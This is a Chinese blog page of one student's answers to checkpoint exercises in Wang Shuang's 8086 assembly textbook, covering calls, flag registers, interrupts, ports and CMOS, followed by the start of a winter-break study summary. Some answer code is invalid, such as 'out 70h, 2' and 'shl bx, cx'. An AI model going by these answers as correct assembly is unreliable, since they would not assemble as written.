 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">stack <span class="meta">segment</span></span><br><span class="line">	<span class="built_in">dw</span> <span class="number">8</span> dup (<span class="number">0</span>)</span><br><span class="line">stack ends</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>,stack</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>,<span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">0</span></span><br><span class="line">	<span class="keyword">call</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0eh</span>]</span><br><span class="line">	<span class="keyword">inc</span> <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">inc</span> <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">inc</span> <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00h</span></span><br><span class="line">	<span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p> ax中的数值为3，注意ds与ss中存放的段地址相同，在执行了call word ptr ds:[0EH]之后，程序会先将下一条指令inc ax的偏移量压栈，然后跳转到栈顶所指向的指令的位置，即跳转至第一条inc ax的位置，故最后ax的值为3。<br> 注意：在使用Debug单步跟踪的时候，由于t命令所导致的中断，而影响了栈中的值。</p>
</li>
<li><p>下面的程序执行后，ax和bx中的数值为多少？</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:codesg</span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line">	<span class="built_in">dw</span> <span class="number">8</span> dup (<span class="number">0</span>)</span><br><span class="line">data ends</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>,data</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>,<span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="number">0</span>],offset s</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ss</span>:[<span class="number">2</span>],<span class="built_in">cs</span></span><br><span class="line">	<span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">nop</span></span><br><span class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>,offset s</span><br><span class="line">	<span class="keyword">sub</span> <span class="built_in">ax</span>,<span class="built_in">ss</span>:[<span class="number">0ch</span>]     </span><br><span class="line">   	<span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="built_in">cs</span></span><br><span class="line">	<span class="keyword">sub</span> <span class="built_in">bx</span>,<span class="built_in">ss</span>:[<span class="number">0eh</span>]</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">4c00h</span></span><br><span class="line">	<span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p> ax中的数值为1，bx中的数值为0，注意到程序的一开始将a的偏移量和cs放入ss:[0]和ss:[2]中，然后调用call指令，将CS和IP(nop指令的偏移量)依此压栈后跳转到s处继续执行，ax最终为s的偏移量减去nop指令所在位置的偏移量，为1，bx最终为cs的段地址相减，为0。</p>
</li>
</ol>
<h2 id="第十一章-标志寄存器"><a href="#第十一章-标志寄存器" class="headerlink" title="第十一章 标志寄存器"></a>第十一章 标志寄存器</h2><h3 id="检测点-11-1"><a href="#检测点-11-1" class="headerlink" title="检测点 11.1"></a>检测点 11.1</h3><p>写出下面每条指令执行后，ZF、PF、SF等标志位的值</p>
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">ZF</th>
<th style="text-align:center">PF</th>
<th style="text-align:center">SF</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">sub al, al</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov al, 1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">push ax</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">pop bx</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">add al, bl</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">add bl, 10</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mul al</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
</tr>
</tbody>
</table>
<h3 id="检测点-11-2"><a href="#检测点-11-2" class="headerlink" title="检测点 11.2"></a>检测点 11.2</h3><p>写出下面每条指令执行后，ZF、PF、SF、CF、OF等标志位的值</p>
<table>
<thead>
<tr>
<th style="text-align:center">指令</th>
<th style="text-align:center">CF</th>
<th style="text-align:center">OF</th>
<th style="text-align:center">SF</th>
<th style="text-align:center">ZF</th>
<th style="text-align:center">PF</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">sub al, al</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">mov al, 10H</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">add al, 90H</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">mov al, 80H</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">add al, 80H</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">mov al, 0FCH</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">add al, 05H</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">mov al, 7DH</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
<td style="text-align:center">0</td>
</tr>
<tr>
<td style="text-align:center">add al, 0BH</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">0</td>
<td style="text-align:center">1</td>
</tr>
</tbody>
</table>
<h3 id="检测点-11-3"><a href="#检测点-11-3" class="headerlink" title="检测点 11.3"></a>检测点 11.3</h3><ol>
<li><p>补全下面的程序，统计F000:0处32个字节中，大小在[32,128]的数据的个数。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0f000h</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">32</span></span><br><span class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span>]</span><br><span class="line">	<span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">32</span></span><br><span class="line">	__________</span><br><span class="line">	<span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">128</span></span><br><span class="line">	__________</span><br><span class="line">	<span class="keyword">inc</span> <span class="built_in">dx</span></span><br><span class="line"><span class="symbol">s0:</span>	<span class="keyword">inc</span> <span class="built_in">bx</span></span><br><span class="line">	<span class="keyword">loop</span> s</span><br></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">jb</span> s0</span><br><span class="line"><span class="keyword">ja</span> s0</span><br></pre></td></tr></table></figure>
</li>
<li><p>补全下面的程序，统计F000:0处32个字节中，大小在(32,128)的数据的个数。</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0f000h</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ds</span>, <span class="built_in">ax</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">dx</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">32</span></span><br><span class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="built_in">bx</span>]</span><br><span class="line">	<span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">32</span></span><br><span class="line">	__________</span><br><span class="line">	<span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">128</span></span><br><span class="line">	__________</span><br><span class="line">	<span class="keyword">inc</span> <span class="built_in">dx</span></span><br><span class="line"><span class="symbol">s0:</span>	<span class="keyword">inc</span> <span class="built_in">bx</span></span><br><span class="line">	<span class="keyword">loop</span> s</span><br></pre></td></tr></table></figure>
<p> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">jna</span> s0</span><br><span class="line"><span class="keyword">jnb</span> s0</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="检测点-11-4"><a href="#检测点-11-4" class="headerlink" title="检测点 11.4"></a>检测点 11.4</h3><p>下面的程序执行后：(ax)=?</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">popf</span> <span class="comment">;将PSW置0(本章所学习的标志位都为0)</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">0fff0h</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="number">0010h</span> <span class="comment">;修改相关标志位</span></span><br><span class="line"><span class="keyword">pushf</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span> <span class="comment">;(将PSW保存至ax)</span></span><br><span class="line"><span class="keyword">and</span> <span class="built_in">al</span>, <span class="number">11000101B</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">ah</span>, <span class="number">00001000B</span> <span class="comment">;只考虑CF,PF,ZF,SF,OF五个标志位</span></span><br></pre></td></tr></table></figure>
<p>答案：<br>(ax)=45H</p>
<h2 id="第十二章-内中断"><a href="#第十二章-内中断" class="headerlink" title="第十二章 内中断"></a>第十二章 内中断</h2><h3 id="检测点-12-1"><a href="#检测点-12-1" class="headerlink" title="检测点 12.1"></a>检测点 12.1</h3><ol>
<li><p>用Debug查看内存，情况如下：<br> 0000:0000 68 10 A7 00 8B 01 70 00-16 00 9D 03 8B 01 70 00<br> 则3号中断源对应的中断处理程序的入口地址为：<strong><strong>____</strong></strong><br> 答案：<br> 0070:018B<br> 注意高地址存放段地址，低地址存放偏移地址</p>
</li>
<li><p>存储N号中断源对应的中断处理程序入口的偏移地址的内存单元的地址为：<strong><strong><br> 存储N号中断源对应的中断处理程序入口的段地址的内存单元的地址为：</strong></strong><br> 答案：4N，4N+2</p>
</li>
</ol>
<h2 id="第十三章-int指令"><a href="#第十三章-int指令" class="headerlink" title="第十三章 int指令"></a>第十三章 int指令</h2><h3 id="检测点-13-1"><a href="#检测点-13-1" class="headerlink" title="检测点 13.1"></a>检测点 13.1</h3><ol>
<li><p>在上面的内容中，我们用7ch中断例程实现loop的功能，则上面的7ch中断例程所能进行的最大转移位移为多少？<br> 答案：65535</p>
</li>
<li><p>用7ch中断例程完成jmp near ptr s指令的功能，用bx向中断例程传送转移位移。<br> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">jnp:</span>	<span class="keyword">push</span> <span class="built_in">bp</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">bp</span>, <span class="built_in">sp</span></span><br><span class="line">	<span class="keyword">add</span> [<span class="built_in">bp</span>+<span class="number">2</span>], <span class="built_in">bx</span></span><br><span class="line">	<span class="keyword">pop</span> <span class="built_in">bp</span></span><br><span class="line">	<span class="keyword">iret</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="检测点-13-2"><a href="#检测点-13-2" class="headerlink" title="检测点 13.2"></a>检测点 13.2</h3><p>判断下面说法的正误：</p>
<ol>
<li>我们可以编程改变FFFF:0处的指令，使得CPU不去执行BIOS中的硬件系统检测和初始化程序。<br> 错误：FFFF:0处的内容无法修改</li>
<li>int 19h中断例程，可以由DOS提供。<br> 错误：此时DOS还未被引导</li>
</ol>
<h2 id="第十四章-端口"><a href="#第十四章-端口" class="headerlink" title="第十四章 端口"></a>第十四章 端口</h2><h3 id="检测点-14-1"><a href="#检测点-14-1" class="headerlink" title="检测点 14.1"></a>检测点 14.1</h3><ol>
<li>编程，读取CMOS RAM的2号单元的内容。 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">out</span> <span class="number">70h</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">in</span> <span class="built_in">al</span>, <span class="number">71h</span></span><br></pre></td></tr></table></figure></li>
<li>编程，向CMOS RAM的2号单元写入0。 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">out</span> <span class="number">70h</span>, <span class="number">2</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">out</span> <span class="number">71h</span>, <span class="built_in">al</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="检测点-14-2"><a href="#检测点-14-2" class="headerlink" title="检测点 14.2"></a>检测点 14.2</h3><p>编程，用加法和位移指令计算(ax)=(ax)*10。<br>提示，(ax)*10=(ax)*2+(ax)*8。</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>, <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">shl</span> <span class="built_in">ax</span>, <span class="number">1</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, <span class="number">3</span></span><br><span class="line"><span class="keyword">shl</span> <span class="built_in">bx</span>, <span class="built_in">cx</span></span><br><span class="line"><span class="keyword">add</span> <span class="built_in">ax</span>, <span class="built_in">bx</span></span><br></pre></td></tr></table></figure>
<h2 id="第十五章-外中断"><a href="#第十五章-外中断" class="headerlink" title="第十五章 外中断"></a>第十五章 外中断</h2><h3 id="检测点-15-1"><a href="#检测点-15-1" class="headerlink" title="检测点 15.1"></a>检测点 15.1</h3><ol>
<li><p>仔细分析一下上面的int 9中断例程，看看是否可以精简一下？<br> 其实在我们的int 9中断例程中，模拟int指令调用原int 9中断例程的程序段是可以精简的，因为在进入中断例程后，IF和TF都已经置0，没有必要再进行设置了。对于程序段：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pushf</span></span><br><span class="line"><span class="keyword">pushf</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">ah</span>, <span class="number">11111100B</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ax</span></span><br><span class="line"><span class="keyword">popf</span></span><br><span class="line"><span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p> 可以精简为：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pushf</span></span><br><span class="line"><span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<p> 两条指令。</p>
</li>
<li><p>仔细分析上面程序中的主程序，看看有什么潜在的问题？<br> 在主程序中，如果在执行设置int 9中断例程的段地址和偏移地址的指令之间发生了键盘中断，则CPU将转去一个错误的地址执行，将发生错误。<br> 找出这样的程序段，改写它们，排除潜在的问题。<br> 提示，注意sti和cli指令的用法。<br> 答案：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cli</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">9</span>*<span class="number">4</span>],offset int9</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="number">9</span>*<span class="number">4</span>+<span class="number">2</span>],<span class="built_in">cs</span></span><br><span class="line"><span class="keyword">sti</span></span><br></pre></td></tr></table></figure>
<p> 以及：</p>
 <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cli</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">es</span>:[<span class="number">9</span>*<span class="number">4</span>]</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">ds</span>:[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">es</span>:[<span class="number">9</span>*<span class="number">4</span>+<span class="number">2</span>]</span><br><span class="line"><span class="keyword">sti</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="第十六章-直接定址表"><a href="#第十六章-直接定址表" class="headerlink" title="第十六章 直接定址表"></a>第十六章 直接定址表</h2><h3 id="检测点-16-1"><a href="#检测点-16-1" class="headerlink" title="检测点 16.1"></a>检测点 16.1</h3><p>下面的程序将code段中a处的8个数据累加，结果存储到b处的双字中，补全程序。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code</span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line">	a <span class="built_in">dw</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></span><br><span class="line">	b <span class="built_in">dd</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">start:</span>	<span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">ax</span>, ____</span><br><span class="line">	<span class="keyword">add</span> ____, <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">adc</span> ____, <span class="number">0</span></span><br><span class="line">	<span class="keyword">add</span> <span class="built_in">si</span>, ____</span><br><span class="line">	<span class="keyword">loop</span> s</span><br><span class="line"></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line">	<span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a[<span class="built_in">si</span>]</span><br><span class="line"><span class="built_in">word</span> <span class="built_in">ptr</span> b[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">word</span> <span class="built_in">ptr</span> b[<span class="number">2</span>]</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure><br>注意word ptr的使用</p>
<h3 id="检测点-16-2"><a href="#检测点-16-2" class="headerlink" title="检测点 16.2"></a>检测点 16.2</h3><p>下面的程序将data段中a处的8个数据累加，结果存储到b处的字中，补全程序。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code, <span class="built_in">es</span>:data</span><br><span class="line"></span><br><span class="line">data <span class="meta">segment</span></span><br><span class="line">a	<span class="built_in">db</span> <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span></span><br><span class="line">b	<span class="built_in">dw</span> <span class="number">0</span></span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span>	__________</span><br><span class="line">	__________</span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">si</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">s:</span>	<span class="keyword">mov</span> <span class="built_in">al</span>, a[<span class="built_in">si</span>]</span><br><span class="line">	<span class="keyword">mov</span> <span class="number">ah</span>, <span class="number">0</span></span><br><span class="line">	<span class="keyword">add</span> b, <span class="built_in">ax</span></span><br><span class="line">	<span class="keyword">inc</span> <span class="built_in">si</span></span><br><span class="line">	<span class="keyword">loop</span> s</span><br><span class="line"></span><br><span class="line">	<span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">4c00h</span></span><br><span class="line">	<span class="keyword">int</span> <span class="number">21h</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><br>答案：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, data</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">es</span>, <span class="built_in">ax</span></span><br></pre></td></tr></table></figure></p>
<h2 id="第十七章-使用BIOS进行键盘输入和磁盘读写"><a href="#第十七章-使用BIOS进行键盘输入和磁盘读写" class="headerlink" title="第十七章 使用BIOS进行键盘输入和磁盘读写"></a>第十七章 使用BIOS进行键盘输入和磁盘读写</h2><h3 id="检测点-17-1"><a href="#检测点-17-1" class="headerlink" title="检测点 17.1"></a>检测点 17.1</h3><p>“在int 16h中断例程中，一定有设置IF=1的指令”，这种说法对吗？</p>
<p>正确，int 16h中断例程在键盘缓冲区中没有数据时，会等待直到键盘缓冲区中有数据为止，因此，int 16h中需要处理int 9h中断，所以一定有设置IF=1的指令。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/03/05/王爽汇编语言第三版检测点答案/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/02/12/寒假总结/">
                            寒假总结
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-02-12T18:21:42+08:00">
	
		    2月 12, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/杂谈/">杂谈</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <blockquote>
<p>颓废的大二上之后感觉良好的一个寒假，可能是我自上学以来效率最高的一个寒假了。</p>
</blockquote>
<h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><h2 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h2><p>大二上刚开学的时候因为数据结构上到链表和树的缘故，在LeetCode上刷了20多道Tag是链表和树的题目。</p>
<p>寒假的时候决心开始刷LeetCode，至寒假结束时已经完成了126道题，其中包括了绝大部分Easy题，以及少部分Medium题，虽然和真正学好算法相差甚远，应该算是基本上入门了。</p>
<p>主要接触了分治法以及相关的复杂度分析，哈希表，随机化相关的算法（蓄水池抽样以及FisherYales洗牌算法），简单的动态规划等。</p>
<p>通过的题目以及解法托管在我的<a href="https://github.com/BlackDragonF/LeetcodeSolutions" target="_blank" rel="noopener">Github</a>上。</p>
